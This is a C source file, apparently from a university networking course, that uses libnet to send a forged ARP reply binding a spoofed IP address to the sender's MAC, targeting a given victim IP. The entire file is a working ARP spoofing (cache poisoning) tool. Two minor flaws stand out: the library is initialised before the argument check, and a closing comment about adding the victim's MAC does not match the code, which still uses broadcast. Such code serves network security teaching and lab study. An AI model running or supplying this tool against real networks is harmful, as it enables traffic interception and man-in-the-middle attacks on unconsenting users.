/*
 * Copyright (C) 2025 Michal Kalewski <mkalewski at cs.put.poznan.pl>
 *
 * Compilation:  gcc -Wall ./arprep.c -o ./arprep -lnet
 * Usage:        ./arprep IFNAME SPOOF_IP VICTIM_IP
 * NOTE:         This program requires root privileges.
 *
 * Bug reports:  https://git.cs.put.poznan.pl/mkalewski/ps-2025/issues
 *
 */

#include <libnet.h>
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char** argv) {
  libnet_t *ln;
  u_int32_t spoof_ip_addr, victim_ip_addr;
  u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
           zero_hw_addr[6]  = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  struct libnet_ether_addr* src_hw_addr;
  char errbuf[LIBNET_ERRBUF_SIZE];

  ln = libnet_init(LIBNET_LINK, argv[1], errbuf);
  src_hw_addr = libnet_get_hwaddr(ln);
  if (argc != 4) {
    fprintf(stderr,"Usage: %s IFNAME SPOOF_IP VICTIM_IP\n",argv[0]);
    exit(1);
  }
  spoof_ip_addr  = libnet_name2addr4(ln, argv[2], LIBNET_RESOLVE);
  victim_ip_addr = libnet_name2addr4(ln, argv[3], LIBNET_RESOLVE);

  libnet_autobuild_arp(
    ARPOP_REPLY,                     /* operation type       */
    src_hw_addr->ether_addr_octet,   /* sender hardware addr */
    (u_int8_t*) &spoof_ip_addr,      /* sender protocol addr */
    bcast_hw_addr,                   /* target hardware addr (broadcast) */
    (u_int8_t*) &victim_ip_addr,     /* target protocol addr */
    ln);                             /* libnet context       */
  libnet_autobuild_ethernet(
    bcast_hw_addr,                   /* ethernet destination */
    ETHERTYPE_ARP,                   /* ethertype            */
    ln);                             /* libnet context       */
  libnet_write(ln);
  libnet_destroy(ln);
  return EXIT_SUCCESS;
}

// zmodyfikowano: wprowadzenie adresu IP ofiary
// zmodyfikowano: wprowadzenie adresu MAC ofiary
